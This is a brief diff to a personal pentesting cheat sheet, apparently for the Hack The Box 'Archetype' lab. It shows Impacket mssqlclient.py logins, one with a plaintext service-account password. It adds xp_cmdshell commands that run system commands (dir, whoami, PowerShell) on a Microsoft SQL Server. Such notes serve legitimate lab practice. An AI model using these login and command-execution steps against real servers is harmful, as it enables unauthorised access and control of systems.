@@ -51,6 +51,12 @@ PSexec.py
 └──╼ [★]$ mssqlclient.py LOGIN:PASS@1.1.1.1 -windows-auth
 └──╼ [★]$ mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.43.111 -windows-auth
 
+SQL> xp_cmdshell dir
+SQL> xp_cmdshell whoami
+//print our current directory
+SQL> xp_cmdshell "powershell -c pwd"
+
+
 https://github.com/SecureAuthCorp/impacket/tree/master/examples
 
 -------------
